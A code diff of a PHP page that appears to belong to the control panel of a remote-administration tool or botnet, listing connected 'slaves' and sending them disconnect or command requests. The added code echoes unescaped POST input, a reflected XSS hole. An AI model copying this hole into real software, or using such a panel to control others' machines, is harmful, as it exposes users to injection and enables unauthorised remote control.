@@ -1,29 +1,33 @@
 <?php
 xdebug_disable();
 
+if (isset($_POST['id'])) {
+	echo $_POST['id'];
+}
+
 require_once "request.php";
 
 $request = new Request();
 $sock = $request->createSocket();
 
-if (isset($_POST['select'])) {
-	if (isset($_POST['disconnect'])) {
+if (isset($_POST ['select'])) {
+	if (isset($_POST ['disconnect'])) {
 		$request->write($sock, 10);
 		$request->write($sock, count($_POST ['select']));
-		foreach ($_POST['select'] as $slave) {
+		foreach ( $_POST ['select'] as $slave ) {
 			$request->write($sock, $slave);
 		}
 	}
-
-	if (isset($_POST['command'])) {
+	
+	if (isset($_POST ['command'])) {
 		$s;
-		foreach ($_POST['select'] as $slave) {
+		foreach ( $_POST ['select'] as $slave ) {
 			$s .= $slave . ",";
 		}
 		header("Location: commands.php?clients=" . $s);
 		exit();
 	}
-	
+
 } else {
 
 }
@@ -36,7 +40,7 @@ require_once "layout/header.php";
 ?>
 
 <script type="text/javascript">
-    setInterval("reload_table();", 1000); 
+    //setInterval("reload_table();", 1000); 
     function reload_table(){
       $('#refresh').load(location.href + ' #table');
     }
@@ -45,17 +49,27 @@ require_once "layout/header.php";
 <script>
 $(document).ready(function() {
     $('#selectall').click(function(event) {
-        if(this.checked) { 
+        if (this.checked) { 
             $('.box').each(function() {
                 this.checked = true;          
             });
-        }else{
+        } else {
             $('.box').each(function() { 
                 this.checked = false;            
             });         
         }
     });
-    
+
+    $('.box').click(function(event) {
+    	$.post("clients.php",
+			{
+    	    	id: this.value,
+    	    },
+    	    function(data, status) {
+    		   	// alert("Data: " + data + "\nStatus: " + status);
+    	 	}
+    	);   
+    });
 });
 </script>
 
@@ -71,7 +85,7 @@ $(document).ready(function() {
 						<form method="POST">
 
 							<h4 class="section-title">Client List (<?php echo count($slaves); ?>)</h4>
-							
+
 							<div class="form-group" align=right>
 								<button type="submit" name="reload" class="btn btn-success">
 									<i class="icon-times"></i> Reload
@@ -106,7 +120,7 @@ $(document).ready(function() {
 						echo "<td>" . $s . "</td>\n";
 					}
 					
-					$page = isset($_GET['page']) ? $_GET['page'] : "all";
+					$page = isset($_GET ['page']) ? $_GET ['page'] : "all";
 					
 					if ($page == 0) {
 						$page = "all";
@@ -118,7 +132,7 @@ $(document).ready(function() {
 						$start = 0;
 						$max = count($slaves);
 					} else {
-						$page--;
+						$page --;
 						
 						$max = 10;
 						$start = $page * $max;
@@ -129,7 +143,7 @@ $(document).ready(function() {
 					}
 					
 					for($i = $start; $i < $start + $max; $i ++) {
-						if (!isset($slaves[$i])) {
+						if (! isset($slaves [$i])) {
 							break;
 						}
 						$slave = $slaves [$i];
@@ -144,7 +158,7 @@ $(document).ready(function() {
 						echo printTableData($slave->getVersion());
 						echo printTableData($slave->getPing());
 						echo printTableData("<a href='client.php?id=" . $slave->getUniqueId() . "'>Control Panel</a>");
-						echo printTableData("<input class='box' type='checkbox' name='select[$i]' value='" . $slave->getUniqueId() . "'>");
+						echo printTableData("<input class='box' id='update' type='checkbox' name='select[$i]' value='" . $slave->getUniqueId() . "'>");
 						echo "</tr>\n";
 					
 					}
@@ -177,7 +191,7 @@ $(document).ready(function() {
 	</div>
 </section>
 
-<?php 
+<?php
 
 require_once "layout/footer.php";
 
